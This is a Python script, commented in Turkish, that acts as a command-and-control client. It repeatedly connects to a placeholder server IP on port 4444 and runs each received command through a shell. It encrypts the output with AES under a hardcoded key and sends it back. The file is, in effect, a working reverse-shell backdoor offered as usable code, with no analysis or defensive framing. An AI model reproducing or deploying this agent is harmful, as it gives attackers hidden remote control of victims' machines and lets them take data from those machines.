import socket
import subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64
import os

# 🔑 AES Şifreleme Anahtarı (Sunucu ile aynı olmalı)
key = b'ThisIsASecretKey'

# 🔒 Yanıtları AES ile şifreleme fonksiyonu
def encrypt_message(message):
    iv = os.urandom(16)  # Rastgele IV oluştur
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(message.encode(), AES.block_size))
    return base64.b64encode(iv + encrypted).decode()

# 📡 C&C Sunucusuna bağlanma
def connect_to_server():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(('SUNUCU_IP', 4444))  # 🖥️ Sunucunun IP adresini buraya yaz
            print("[+] Sunucuya bağlandı, komut bekleniyor...")

            while True:
                command = client.recv(1024).decode()
                if command.lower() == "exit":
                    client.close()
                    break

                try:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                except Exception as e:
                    output = str(e)

                encrypted_result = encrypt_message(output)
                client.send(encrypted_result.encode())

        except Exception as e:
            print(f"[!] Bağlantı hatası: {e}. 5 saniye içinde tekrar denenecek...")
            client.close()

if __name__ == "__main__":
    connect_to_server()
